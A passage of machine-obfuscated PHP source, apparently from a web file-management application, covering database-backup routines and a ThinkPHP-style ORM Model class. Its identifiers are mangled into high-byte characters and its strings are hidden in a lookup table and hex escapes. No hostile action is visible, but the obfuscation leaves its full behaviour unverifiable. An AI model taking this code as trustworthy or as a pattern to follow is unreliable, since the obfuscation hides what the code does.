$GLOBALS[$„Á¨Ä–˜[898]] = self::$name; foreach ($ÀĞ“œ…• as $•Äé—”) { $æ´Ø¹å­ = $é¶¬³»ä . $•Äé—” . $„Á¨Ä–˜[899]; if ($•Äé—” == $„Á¨Ä–˜[893]) { @touch($æ´Ø¹å­); continue; } $Ú¸Ïàù = null; if ($•Äé—” == $„Á¨Ä–˜[900] && $¹Üßìó¹[$„Á¨Ä–˜[170]] == $„Á¨Ä–˜[885]) { $Ú¸Ïàù = self::$io; } $Šˆæ®…· += $†Óí©Çš->sqlFromDb($•Äé—”, $æ´Ø¹å­, $İÎş¯Œ, $Ú¸Ïàù); } unset($GLOBALS[$„Á¨Ä–˜[898]]); $İÎş¯Œ->end(); if ($Šˆæ®…· > $û•ÇªÆ…) { $û•ÇªÆ… = $Šˆæ®…·; } $Ô ‹–—Ò = array($„Á¨Ä–˜[887] => $ÌÇøŒä¶, $„Á¨Ä–˜[882] => 1, $„Á¨Ä–˜[901] => $û•ÇªÆ…, $„Á¨Ä–˜[902] => $Šˆæ®…·, $„Á¨Ä–˜[903] => time()); Backup::set($Ô ‹–—Ò); if ($û•ÇªÆ… - $Šˆæ®…· > 0) { $ÁŞ£©¹ç = $„Á¨Ä–˜[904]; if (!stristr(I18n::getType(), $„Á¨Ä–˜[905])) { $ÁŞ£©¹ç = $„Á¨Ä–˜[906]; } Backup::log(array($ÁŞ£©¹ç, $Ô ‹–—Ò)); return !1; } return !0; } private function tmpFilesPath() { $•«»”û =& $_SERVER[Ï×Œõ”û]; $£Ÿåîï = TEMP_FILES; if ($GLOBALS[$•«»”û[6]][$•«»”û[92]][$•«»”û[907]]) { $£Ÿåîï = $GLOBALS[$•«»”û[6]][$•«»”û[92]][$•«»”û[907]]; if (!mk_dir($£Ÿåîï) || !is_writable($£Ÿåîï) || !IO::mkfile($£Ÿåîï . $•«»”û[908])) { $£Ÿåîï = TEMP_FILES; } } return $£Ÿåîï; } } class BackupDbFile { public function __construct() { } public function index() { $ä€åÄÂµ =& $_SERVER[Ï×Œõ”û]; $¬ä®¤ıò = Backup::get(); $û¸ß¦« = $¬ä®¤ıò[$ä€åÄÂµ[32]]; $Ä‰ŸÃå = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\x70\137{$û¸ß¦«}\57"; $ÍÑò®Ì” = $this->backupPath($¬ä®¤ıò); if (!($ÍÑò®Ì” = IO::mkdir($ÍÑò®Ì”))) { Backup::log($ä€åÄÂµ[909] . $ÍÑò®Ì”); return !1; } $Ì¯äş¸ = new DbManage(); $—…Ëš = $Ì¯äş¸->getSqlFile(); if (!$—…Ëš || !$—…Ëš[$ä€åÄÂµ[910]] || !$—…Ëš[$ä€åÄÂµ[13]]) { Backup::log($ä€åÄÂµ[911]); return !1; } IO::move($—…Ëš[$ä€åÄÂµ[910]], $Ä‰ŸÃå); IO::move($—…Ëš[$ä€åÄÂµ[13]], $Ä‰ŸÃå); $Ì¯äş¸->mixBakList($Ä‰ŸÃå); $ËœÃé–Ê = IO::listPath($Ä‰ŸÃå); $±Îşˆ·ô = isset($ËœÃé–Ê[$ä€åÄÂµ[86]]) ? $ËœÃé–Ê[$ä€åÄÂµ[86]] : array(); $ó¤Ãí®· = array_sum(array_column($±Îşˆ·ô, $ä€åÄÂµ[79])); if (!$ó¤Ãí®·) { Backup::log($ä€åÄÂµ[912] . $Ä‰ŸÃå); return !1; } $Éä¯×© = array($ä€åÄÂµ[913] => $ó¤Ãí®·, $ä€åÄÂµ[914] => time()); Backup::set($Éä¯×©); Hook::trigger($ä€åÄÂµ[915], $Ä‰ŸÃå, $ÍÑò®Ì”); $¼Ú‚ı¤Ú = new TaskFileTransfer($ä€åÄÂµ[915], $ä€åÄÂµ[886], count($±Îşˆ·ô), LNG($ä€åÄÂµ[895]) . $ä€åÄÂµ[474] . LNG($ä€åÄÂµ[897]) . $ä€åÄÂµ[916]); $¼Ú‚ı¤Ú->task[$ä€åÄÂµ[870]] = $ó¤Ãí®·; foreach ($ËœÃé–Ê[$ä€åÄÂµ[86]] as $ ’ÃˆØ) { $áÔìÁ¿è = IO::move($ ’ÃˆØ[$ä€åÄÂµ[87]], $ÍÑò®Ì”); if (!$áÔìÁ¿è) { $¼Ú‚ı¤Ú->end(); $ÛŞíº×Á = IO::getLastError($ä€åÄÂµ[917] . $ ’ÃˆØ[$ä€åÄÂµ[87]] . $ä€åÄÂµ[918] . $ÍÑò®Ì” . $ä€åÄÂµ[177]); Backup::log($ÛŞíº×Á); return !1; } } $¼Ú‚ı¤Ú->end(); $Éä¯×© = array($ä€åÄÂµ[919] => $ó¤Ãí®·, $ä€åÄÂµ[920] => time()); Backup::set($Éä¯×©); return !0; } private function backupPath($íÀºÆ’¦) { $Æ³¯­ë =& $_SERVER[Ï×Œõ”û]; $ŠÊ˜íÃ¨ = $íÀºÆ’¦[$Æ³¯­ë[32]]; $Êİœô° = Model($Æ³¯­ë[879])->get($Æ³¯­ë[880]); $ìÜş§°… = substr(md5($Æ³¯­ë[881] . $Êİœô° . $ŠÊ˜íÃ¨), 0, 8); return "\173\151\157\x3a{$íÀºÆ’¦[$Æ³¯­ë[858]]}\x7d\x2f\x64\141\164\x61\142\x61\x73\145\x2f\142\141\x63\x6b\x75\x70\x2f" . $ŠÊ˜íÃ¨ . $Æ³¯­ë[11] . $ìÜş§°…; } private function tmpFilesPath() { $Ì­åÍ¹Œ =& $_SERVER[Ï×Œõ”û]; $Ø×É£Á³ = TEMP_FILES; if ($GLOBALS[$Ì­åÍ¹Œ[6]][$Ì­åÍ¹Œ[92]][$Ì­åÍ¹Œ[907]]) { $Ø×É£Á³ = $GLOBALS[$Ì­åÍ¹Œ[6]][$Ì­åÍ¹Œ[92]][$Ì­åÍ¹Œ[907]]; if (!mk_dir($Ø×É£Á³) || !is_writable($Ø×É£Á³) || !IO::mkfile($Ø×É£Á³ . $Ì­åÍ¹Œ[908])) { $Ø×É£Á³ = TEMP_FILES; } } return $Ø×É£Á³; } } goto B“ˆ¥ˆæÅ; Aòò–Øï¥: define($_SERVER[Ï×Œõ”û][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\157\162\x64\x65\x72", "\x61\x6c\151\141\163", "\x68\x61\x76\151\156\x67", "\x67\162\x6f\x75\160", "\154\157\143\x6b", "\x64\151\163\x74\151\156\143\164", "\x61\165\x74\157", "\x66\151\154\164\x65\x72", "\166\x61\x6c\x69\x64\x61\164\145", "\162\145\x73\165\154\x74", "\x62\151\156\x64", "\164\x6f\153\x65\156"); public function __construct($æ±»ë¹Ö = '', $Öù’ÙÓ‰ = '', $£¦‹§À = '') { $êßÁ…Úì =& $_SERVER[Ï×Œõ”û]; $this->_initialize(); if (!empty($æ±»ë¹Ö)) { if (strpos($æ±»ë¹Ö, $êßÁ…Úì[10])) { list($this->dbName, $this->name) = explode($êßÁ…Úì[10], $æ±»ë¹Ö); } else { $this->name = $æ±»ë¹Ö; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Öù’ÙÓ‰)) { $this->tablePrefix = $êßÁ…Úì[12]; } elseif ($êßÁ…Úì[12] != $Öù’ÙÓ‰) { $this->tablePrefix = $Öù’ÙÓ‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($êßÁ…Úì[323]); } $this->db(0, empty($this->connection) ? $£¦‹§À : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $šç×¦åÎ =& $_SERVER[Ï×Œõ”û]; if (empty($this->fields)) { if (think_config($šç×¦åÎ[324])) { $ÎşÑÀì­ = $this->dbName ? $this->dbName : think_config($šç×¦åÎ[325]); $ÄÛò¹ÂÚ = think_var_cache($šç×¦åÎ[326] . strtolower(get_path_this($ÎşÑÀì­) . $šç×¦åÎ[10] . $this->name)); if ($ÄÛò¹ÂÚ) { $ˆñÆŒ = think_config($šç×¦åÎ[327]); if (empty($ˆñÆŒ) || $ÄÛò¹ÂÚ[$šç×¦åÎ[328]] == $ˆñÆŒ) { $this->fields = $ÄÛò¹ÂÚ; return; } } } $this->flush(); } } public function flush() { $—ƒÈ½¤ç =& $_SERVER[Ï×Œõ”û]; $this->db->setModel($this->name); $Éó¬œ¢¯ = $this->db->getFields($this->getTableName()); if (!$Éó¬œ¢¯) { return !1; } $this->fields = array_keys($Éó¬œ¢¯); $this->fields[$—ƒÈ½¤ç[329]] = !1; foreach ($Éó¬œ¢¯ as $‘óşñÔë => $¿ûˆŒÂü) { $¨À­…©£[$‘óşñÔë] = $¿ûˆŒÂü[$—ƒÈ½¤ç[33]]; if ($¿ûˆŒÂü[$—ƒÈ½¤ç[39]]) { $this->fields[$—ƒÈ½¤ç[330]] = $‘óşñÔë; if ($¿ûˆŒÂü[$—ƒÈ½¤ç[42]]) { $this->fields[$—ƒÈ½¤ç[329]] = !0; } } } $this->fields[$—ƒÈ½¤ç[331]] = $¨À­…©£; if (think_config($—ƒÈ½¤ç[327])) { $this->fields[$—ƒÈ½¤ç[328]] = think_config($—ƒÈ½¤ç[327]); } if (think_config($—ƒÈ½¤ç[324])) { $ğæ¥ûá = $this->dbName ? $this->dbName : think_config($—ƒÈ½¤ç[325]); think_var_cache($—ƒÈ½¤ç[326] . strtolower(get_path_this($ğæ¥ûá) . $—ƒÈ½¤ç[10] . $this->name), $this->fields); } } public function switchModel($Ö‰ù¿¢Ì, $×Á°½ = array()) { $½©ÜÔá =& $_SERVER[Ï×Œõ”û]; $è¸ŸÄü€ = ucwords(strtolower($Ö‰ù¿¢Ì)) . $½©ÜÔá[332]; if (!class_exists($è¸ŸÄü€)) { think_exception($è¸ŸÄü€ . think_lang($½©ÜÔá[333])); } $this->_extModel = new $è¸ŸÄü€($this->name); if (!empty($×Á°½)) { foreach ($×Á°½ as $äœ÷ÔÚÑ) { $this->_extModel->setProperty($äœ÷ÔÚÑ, $this->{$äœ÷ÔÚÑ}); } } return $this->_extModel; } public function __set($ˆè€“„—, $£Ÿâà¢ï) { $this->data[$ˆè€“„—] = $£Ÿâà¢ï; } public function __get($š­Áˆ™Ë) { return isset($this->data[$š­Áˆ™Ë]) ? $this->data[$š­Áˆ™Ë] : null; } public function __isset($¢ä€Ø¨î) { return isset($this->data[$¢ä€Ø¨î]); } public function __unset($ŞáŒ®Ë) { unset($this->data[$ŞáŒ®Ë]); } public function __call($Úœ†¢²ñ, $ú¥ÇÇô¼) { $´£ ÃİÇ =& $_SERVER[Ï×Œõ”û]; if (in_array(strtolower($Úœ†¢²ñ), $this->methods, !0)) { $this->options[strtolower($Úœ†¢²ñ)] = $ú¥ÇÇô¼[0]; return $this; } elseif (in_array(strtolower($Úœ†¢²ñ), array($´£ ÃİÇ[334], $´£ ÃİÇ[335], $´£ ÃİÇ[336], $´£ ÃİÇ[337], $´£ ÃİÇ[338]), !0)) { $ÄÚæÑãü = isset($ú¥ÇÇô¼[0]) ? $ú¥ÇÇô¼[0] : $´£ ÃİÇ[222]; $ÄÚæÑãü = $this->db->parseKey($ÄÚæÑãü); return $this->getField(strtoupper($Úœ†¢²ñ) . $´£ ÃİÇ[339] . $ÄÚæÑãü . $´£ ÃİÇ[340] . $Úœ†¢²ñ, $´£ ÃİÇ[334]); } elseif (strtolower(substr($Úœ†¢²ñ, 0, 5)) == $´£ ÃİÇ[341]) { $ÄÚæÑãü = think_parse_name(substr($Úœ†¢²ñ, 5)); $Õôã„Åß[$ÄÚæÑãü] = $ú¥ÇÇô¼[0]; return $this->where($Õôã„Åß)->find(); } elseif (strtolower(substr($Úœ†¢²ñ, 0, 10)) == $´£ ÃİÇ[342]) { $ìĞ÷†Ö­ = think_parse_name(substr($Úœ†¢²ñ, 10)); $Õôã„Åß[$ìĞ÷†Ö­] = $ú¥ÇÇô¼[0]; return $this->where($Õôã„Åß)->getField($ú¥ÇÇô¼[1]); } elseif (isset($this->_scope[$Úœ†¢²ñ])) { return $this->scope($Úœ†¢²ñ, $ú¥ÇÇô¼[0]); } elseif (method_exists($this, $Úœ†¢²ñ) || method_exists($this, $´£ ÃİÇ[343] . $Úœ†¢²ñ)) { array_unshift($ú¥ÇÇô¼, $Úœ†¢²ñ); return call_user_func_array(array($this, $´£ ÃİÇ[344]), $ú¥ÇÇô¼); } else { return call_user_func_array(array(parent, $Úœ†¢²ñ), $ú¥ÇÇô¼); } } protected function call() { $ì¦¸ÊÖŞ =& $_SERVER[Ï×Œõ”û]; $Ô„¦¤ = func_get_args(); $ªì¯±ÕŞ = array_shift($Ô„¦¤); $Î³å—Ãü = $ªì¯±ÕŞ; if (is_array($ªì¯±ÕŞ)) { $Î³å—Ãü = $ªì¯±ÕŞ[1]; $ªì¯±ÕŞ = $ªì¯±ÕŞ[0]; } $÷®øìï = count($Ô„¦¤) - 1; if (isset($Ô„¦¤[$÷®øìï]) && $Ô„¦¤[$÷®øìï] === $ªì¯±ÕŞ) { think_exception(__CLASS__ . $ì¦¸ÊÖŞ[4] . $ªì¯±ÕŞ . think_lang($ì¦¸ÊÖŞ[345])); return; } $Ô„¦¤[] = $ªì¯±ÕŞ; if (method_exists($this, $ì¦¸ÊÖŞ[346])) { $ŸïÇÃï = call_user_func_array(array($this, $ì¦¸ÊÖŞ[347]), array($Î³å—Ãü, $Ô„¦¤)); if (!is_null($ŸïÇÃï) && $ŸïÇÃï !== !1) { return $ŸïÇÃï; } } $¦šµ¼¹Ê = !1; if (method_exists($this, $ªì¯±ÕŞ)) { $¦šµ¼¹Ê = call_user_func_array(array($this, $ªì¯±ÕŞ), $Ô„¦¤); } if (method_exists($this, $ì¦¸ÊÖŞ[348])) { $ŸïÇÃï = call_user_func_array(array($this, $ì¦¸ÊÖŞ[349]), array($Î³å—Ãü, $Ô„¦¤, $¦šµ¼¹Ê)); if ($ŸïÇÃï) { return $ŸïÇÃï; } } return $¦šµ¼¹Ê; } protected function _initialize() { } protected function _facade($«ôÍÚğ°) { $Æµº¬® =& $_SERVER[Ï×Œõ”û]; if (!empty($this->fields)) { foreach ($«ôÍÚğ° as $ØÈĞíØ => $ËääÇ¥Î) { if (is_array($this->fields) && !in_array($ØÈĞíØ, $this->fields, !0)) { unset($«ôÍÚğ°[$ØÈĞíØ]); } elseif (is_scalar($ËääÇ¥Î)) { $this->_parseType($«ôÍÚğ°, $ØÈĞíØ); } } } if (!empty($this->options[$Æµº¬®[350]])) { $«ôÍÚğ° = array_map($this->options[$Æµº¬®[350]], $«ôÍÚğ°); unset($this->options[$Æµº¬®[350]]); } $this->_beforeWrite($«ôÍÚğ°); return $«ôÍÚğ°; } protected function _beforeWrite(&$Ñçß“ïá) { } public function add($¾ ÙŸ = '', $Ëçø²Øç = array(), $ÍıÃÌ³« = false) { if (empty($¾ ÙŸ)) { if (!empty($this->data)) { $¾ ÙŸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ï×Œõ”û][351]); return !1; } } $Ëçø²Øç = $this->_parseOptions($Ëçø²Øç); $¾ ÙŸ = $this->_facade($¾ ÙŸ); if (!1 === $this->_beforeInsert($¾ ÙŸ, $Ëçø²Øç)) { return !1; } $“¡œ¯ËÚ = $this->db->insert($¾ ÙŸ, $Ëçø²Øç, $ÍıÃÌ³«); if (!1 !== $“¡œ¯ËÚ) { $„Î’Ş” = $this->getLastInsID(); if ($„Î’Ş”) { $¾ ÙŸ[$this->getPk()] = $„Î’Ş”; $this->_after_insert($¾ ÙŸ, $Ëçø²Øç); return $„Î’Ş”; } $this->_after_insert($¾ ÙŸ, $Ëçø²Øç); } return $“¡œ¯ËÚ; } protected function _beforeInsert(&$ÜùÅ ñ, $Ê®“šİâ) { } protected function _after_insert($’§Ü„Åö, $…ÃÂñ‹) { } public function addAll($Ç¢ò“âã, $±úÊ˜˜ = array(), $úÁû¶ü = false) { $ÉıåÌš =& $_SERVER[Ï×Œõ”û]; if (empty($Ç¢ò“âã)) { $this->error = think_lang($ÉıåÌš[351]); return !1; } $±úÊ˜˜ = $this->_parseOptions($±úÊ˜˜); foreach ($Ç¢ò“âã as $İÇ¶‰¿ß => $€¡ƒæÎ) { $Ç¢ò“âã[$İÇ¶‰¿ß] = $this->_facade($€¡ƒæÎ); } if (method_exists($this->db, $ÉıåÌš[352])) { $›ŠÛâ‚ = $this->db->insertAll($Ç¢ò“âã, $±úÊ˜˜, $úÁû¶ü); } else { $this->startTrans(); foreach ($Ç¢ò“âã as $İÇ¶‰¿ß => $€¡ƒæÎ) { $›ŠÛâ‚ = $this->db->insert($€¡ƒæÎ, $±úÊ˜˜, $úÁû¶ü); } $this->commit(); } if (!1 !== $›ŠÛâ‚) { $Ç£¶ğ¡ = $this->getLastInsID(); if ($Ç£¶ğ¡) { return $Ç£¶ğ¡; } } return $›ŠÛâ‚; } public function selectAdd($öãæî³ˆ = '', $šÜŒÛ—« = '', $² ®•Ù = array()) { $İ¬†ê”å =& $_SERVER[Ï×Œõ”û]; $² ®•Ù = $this->_parseOptions($² ®•Ù); if (!1 === ($õè¹¸ïı = $this->db->selectInsert($öãæî³ˆ ? $öãæî³ˆ : $² ®•Ù[$İ¬†ê”å[353]], $šÜŒÛ—« ? $šÜŒÛ—« : $this->getTableName(), $² ®•Ù))) { $this->error = think_lang($İ¬†ê”å[354]); return !1; } else { return $õè¹¸ïı; } } public function save($éÁ±úÈÆ = '', $´É’Æà = array()) { $½ÌÀ——Œ =& $_SERVER[Ï×Œõ”û]; if (empty($éÁ±úÈÆ)) { if (!empty($this->data)) { $éÁ±úÈÆ = $this->data; $this->data = array(); } else { $this->error = think_lang($½ÌÀ——Œ[351]); return !1; } } $éÁ±úÈÆ = $this->_facade($éÁ±úÈÆ); $´É’Æà = $this->_parseOptions($´É’Æà); $¨ÙÉŠ±À = $this->getPk(); if (!isset($´É’Æà[$½ÌÀ——Œ[355]])) { if (isset($éÁ±úÈÆ[$¨ÙÉŠ±À])) { $ĞÄÀÙÎ[$¨ÙÉŠ±À] = $éÁ±úÈÆ[$¨ÙÉŠ±À]; $´É’Æà[$½ÌÀ——Œ[355]] = $ĞÄÀÙÎ; unset($éÁ±úÈÆ[$¨ÙÉŠ±À]); } else { $this->error = think_lang($½ÌÀ——Œ[354]); return !1; } } if (is_array($´É’Æà[$½ÌÀ——Œ[355]]) && isset($´É’Æà[$½ÌÀ——Œ[355]][$¨ÙÉŠ±À])) { $ç«åáü = $´É’Æà[$½ÌÀ——Œ[355]][$¨ÙÉŠ±À]; } if (!1 === $this->_beforeUpdate($éÁ±úÈÆ, $´É’Æà)) { return !1; } $¿ à’ø© = $this->db->update($éÁ±úÈÆ, $´É’Æà); if (!1 !== $¿ à’ø©) { if (isset($ç«åáü)) { $éÁ±úÈÆ[$¨ÙÉŠ±À] = $ç«åáü; } $this->_afterUpdate($éÁ±úÈÆ, $´É’Æà); } return $¿ à’ø©; } protected function _beforeUpdate(&$Éú·›’, $˜®Öşà) { } protected function _afterUpdate($Í¬‡Ùöß, $•¨Ğ”îô) { } public function delete($é­ áğ² = array()) { $ğ£ã«ª„ =& $_SERVER[Ï×Œõ”û]; if (empty($é­ áğ²) && empty($this->options[$ğ£ã«ª„[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $‹Ú¨ú”¤ = $this->getPk(); if (is_numeric($é­ áğ²) || is_string($é­ áğ²)) { if (strpos($é­ áğ², $ğ£ã«ª„[50])) { $»·—¤Ø¹[$‹Ú¨ú”¤] = array($ğ£ã«ª„[356], $é­ áğ²); } else { $»·—¤Ø¹[$‹Ú¨ú”¤] = $é­ áğ²; } $this->options[$ğ£ã«ª„[355]] = $»·—¤Ø¹; } $é­ áğ² = $this->_parseOptions(); if (is_array($é­ áğ²[$ğ£ã«ª„[355]]) && isset($é­ áğ²[$ğ£ã«ª„[355]][$‹Ú¨ú”¤])) { $Ú‚ìæ¯Å = $é­ áğ²[$ğ£ã«ª„[355]][$‹Ú¨ú”¤]; } $¾¨ªÏë¯ = $this->db->delete($é­ áğ²); if (!1 !== $¾¨ªÏë¯) { $ïòÑ¾‡Î = array(); if (isset($Ú‚ìæ¯Å)) { $ïòÑ¾‡Î[$‹Ú¨ú”¤] = $Ú‚ìæ¯Å; } $this->_after_delete($ïòÑ¾‡Î, $é­ áğ²); } return $¾¨ªÏë¯; } protected function _after_delete($ş¦ø”×ƒ, $÷ûÖğ˜) { } public function select($ö•´¦ğ = array()) { $ €Ê‡öì =& $_SERVER[Ï×Œõ”û]; if (is_string($ö•´¦ğ) || is_numeric($ö•´¦ğ)) { $¹ÑÁ€¸½ = $this->getPk(); if (strpos($ö•´¦ğ, $ €Ê‡öì[50])) { $Òİİ«Ã®[$¹ÑÁ€¸½] = array($ €Ê‡öì[356], $ö•´¦ğ); } else { $Òİİ«Ã®[$¹ÑÁ€¸½] = $ö•´¦ğ; } $this->options[$ €Ê‡öì[355]] = $Òİİ«Ã®; } elseif (!1 === $ö•´¦ğ) { $ö•´¦ğ = $this->_parseOptions(); return $ €Ê‡öì[357] . $this->db->buildSelectSql($ö•´¦ğ) . $ €Ê‡öì[358]; } $ö•´¦ğ = $this->_parseOptions(); $»ú‚Şšë = $this->db->select($ö•´¦ğ); if (!1 === $»ú‚Şšë) { return !1; } if (empty($»ú‚Şšë)) { return null; } $this->_afterSelect($»ú‚Şšë, $ö•´¦ğ); return $»ú‚Şšë; } protected function _afterSelect(&$Ã·ÁªÛ®, $Ê¤‘Ñ Í) { } public function buildSql($±¾§ËÃ· = array()) { $°Ñ’—İé =& $_SERVER[Ï×Œõ”û]; $±¾§ËÃ· = $this->_parseOptions($±¾§ËÃ·); return $°Ñ’—İé[357] . $this->db->buildSelectSql($±¾§ËÃ·) . $°Ñ’—İé[358]; } public function optionsValue($ğîÇáÏí = null) { if (is_null($ğîÇáÏí)) { return $this->options; } elseif (is_array($ğîÇáÏí)) { $this->options = array_merge($this->options, $ğîÇáÏí); } } protected function _parseOptions($ƒ¡¡Î±˜ = array()) { $Ñ¹Ş·Á¨ =& $_SERVER[Ï×Œõ”û]; if (is_array($ƒ¡¡Î±˜)) { $ƒ¡¡Î±˜ = array_merge($this->options, $ƒ¡¡Î±˜); } $this->options = array(); if (!isset($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[359]])) { $ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[359]] = $this->getTableName(); $›ğÚ××Ã = $this->fields; } else { $›ğÚ××Ã = $this->getDbFields(); } if (!empty($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[360]])) { $ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[359]] .= $Ñ¹Ş·Á¨[53] . $ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[360]]; } $ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[361]] = $this->name; if (isset($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[355]]) && is_array($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[355]]) && !empty($›ğÚ××Ã) && !isset($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[362]]) && !isset($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[359]])) { foreach ($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[355]] as $†¶Ö•Í => $ŸĞ…ì³’) { $†¶Ö•Í = trim($†¶Ö•Í); if (in_array($†¶Ö•Í, $›ğÚ××Ã, !0)) { if (is_scalar($ŸĞ…ì³’)) { $this->_parseType($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[355]], $†¶Ö•Í); } } elseif (!is_numeric($†¶Ö•Í) && $Ñ¹Ş·Á¨[11] != substr($†¶Ö•Í, 0, 1) && !1 === strpos($†¶Ö•Í, $Ñ¹Ş·Á¨[10]) && !1 === strpos($†¶Ö•Í, $Ñ¹Ş·Á¨[339]) && !1 === strpos($†¶Ö•Í, $Ñ¹Ş·Á¨[214]) && !1 === strpos($†¶Ö•Í, $Ñ¹Ş·Á¨[286])) { unset($ƒ¡¡Î±˜[$Ñ¹Ş·Á¨[355]][$†¶Ö•Í]); } } } $this->_options_filter($ƒ¡¡Î±˜); return $ƒ¡¡Î±˜; } protected function _options_filter(&$“ï½îİ) { } protected function _parseType(&$€ÔÕøÍ, $Ø’Ãò®) { $ßœ¿“³È =& $_SERVER[Ï×Œõ”û]; if (empty($this->options[$ßœ¿“³È[363]][$ßœ¿“³È[4] . $Ø’Ãò®])) { $ŸŞƒ¡Â… = strtolower($this->fields[$ßœ¿“³È[331]][$Ø’Ãò®]); if (!1 !== strpos($ŸŞƒ¡Â…, $ßœ¿“³È[364])) { } elseif (!1 === strpos($ŸŞƒ¡Â…, $ßœ¿“³È[365]) && !1 !== strpos($ŸŞƒ¡Â…, $ßœ¿“³È[366])) { $€ÔÕøÍ[$Ø’Ãò®] = intval($€ÔÕøÍ[$Ø’Ãò®]); } elseif (!1 !== strpos($ŸŞƒ¡Â…, $ßœ¿“³È[367]) || !1 !== strpos($ŸŞƒ¡Â…, $ßœ¿“³È[368])) { $€ÔÕøÍ[$Ø’Ãò®] = floatval($€ÔÕøÍ[$Ø’Ãò®]); } elseif (!1 !== strpos($ŸŞƒ¡Â…, $ßœ¿“³È[369])) { $€ÔÕøÍ[$Ø’Ãò®] = (bool) $€ÔÕøÍ[$Ø’Ãò®]; } } } public function find($‡×Šìù‘ = array()) { $Å…‹Õ¬¥ =& $_SERVER[Ï×Œõ”û]; if (is_numeric($‡×Šìù‘) || is_string($‡×Šìù‘)) { $‘İ­™¦[$this->getPk()] = intval($‡×Šìù‘); $this->options[$Å…‹Õ¬¥[355]] = $‘İ­™¦; } $this->options[$Å…‹Õ¬¥[370]] = 1; $‡×Šìù‘ = $this->_parseOptions(); $âÅãÃ„ƒ = $this->db->select($‡×Šìù‘); if (!1 === $âÅãÃ„ƒ) { return !1; } if (empty($âÅãÃ„ƒ)) { return null; } $…Öà‡ = $âÅãÃ„ƒ[0]; $this->_afterFind($…Öà‡, $‡×Šìù‘); return $…Öà‡; } protected function _afterFind(&$¨¢êºì±, $»ìó®÷) { } protected function returnResult($à®ÀÚê», $‡Àà·ßÇ = '') { $ÆÛÎÑïÃ =& $_SERVER[Ï×Œõ”û]; if ($‡Àà·ßÇ) { if (is_callable($‡Àà·ßÇ)) { return call_user_func($‡Àà·ßÇ, $à®ÀÚê»); } switch (strtolower($‡Àà·ßÇ)) { case $ÆÛÎÑïÃ[371]: return json_encode($à®ÀÚê»); case $ÆÛÎÑïÃ[372]: return xml_encode($à®ÀÚê»); } } return $à®ÀÚê»; } public function parseFieldsMap($…³î„Î©, $ë»•±Êæ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÓÚÖÇ”× => $¿ş¯Ö¤†) { if ($ë»•±Êæ == 1) { if (isset($…³î„Î©[$¿ş¯Ö¤†])) { $…³î„Î©[$ÓÚÖÇ”×] = $…³î„Î©[$¿ş¯Ö¤†]; unset($…³î„Î©[$¿ş¯Ö¤†]); } } else { if (isset($…³î„Î©[$ÓÚÖÇ”×])) { $…³î„Î©[$¿ş¯Ö¤†] = $…³î„Î©[$ÓÚÖÇ”×]; unset($…³î„Î©[$ÓÚÖÇ”×]); } } } } return $…³î„Î©; } public function setField($ùÖî«„, $ø×·Šûû = '') { if (is_array($ùÖî«„)) { $Úï÷ÇÌ = $ùÖî«„; } else { $Úï÷ÇÌ[$ùÖî«„] = $ø×·Šûû; } return $this->save($Úï÷ÇÌ); } public function setAdd($ãå©ôÈ•, $ïÕÎ¶€‘ = 1) { $ÆÓÈ =& $_SERVER[Ï×Œõ”û]; $¿ë²Ù¸· = $ãå©ôÈ• . $ÆÓÈ[373] . $ïÕÎ¶€‘; if ($ïÕÎ¶€‘ < 0) { $¿ë²Ù¸· = $ãå©ôÈ• . $ïÕÎ¶€‘; } return $this->setField($ãå©ôÈ•, array($ÆÓÈ[374], $¿ë²Ù¸·)); } public function getField($ıšÑÔ·, $¯®‘„öû = null) { $‡›ğö–ı =& $_SERVER[Ï×Œõ”û]; $ã›€æß©[$‡›ğö–ı[353]] = $ıšÑÔ·; $ã›€æß© = $this->_parseOptions($ã›€æß©); $ıšÑÔ· = trim($ıšÑÔ·); if (strpos($ıšÑÔ·, $‡›ğö–ı[50])) { if (!isset($ã›€æß©[$‡›ğö–ı[370]])) { $ã›€æß©[$‡›ğö–ı[370]] = is_numeric($¯®‘„öû) ? $¯®‘„öû : $‡›ğö–ı[12]; } $¤Ÿ®«‰† = $this->db->select($ã›€æß©); if (!empty($¤Ÿ®«‰†)) { $¸Î¾…É = explode($‡›ğö–ı[50], $ıšÑÔ·); $ıšÑÔ· = array_keys($¤Ÿ®«‰†[0]); $Ü¨ŒÆÁ€ = array_shift($ıšÑÔ·); $¢‰–œ¾× = array_shift($ıšÑÔ·); $İÌË˜“ï = array(); $×½ã‘§Ù = count($¸Î¾…É); foreach ($¤Ÿ®«‰† as $Œ€³©‘¤) { $ ×œÚóĞ = $Œ€³©‘¤[$Ü¨ŒÆÁ€]; if (2 == $×½ã‘§Ù) { $İÌË˜“ï[$ ×œÚóĞ] = $Œ€³©‘¤[$¢‰–œ¾×]; } else { $İÌË˜“ï[$ ×œÚóĞ] = is_string($¯®‘„öû) ? implode($¯®‘„öû, $Œ€³©‘¤) : $Œ€³©‘¤; } } return $İÌË˜“ï; } } else { if (!0 !== $¯®‘„öû) { $ã›€æß©[$‡›ğö–ı[370]] = is_numeric($¯®‘„öû) ? 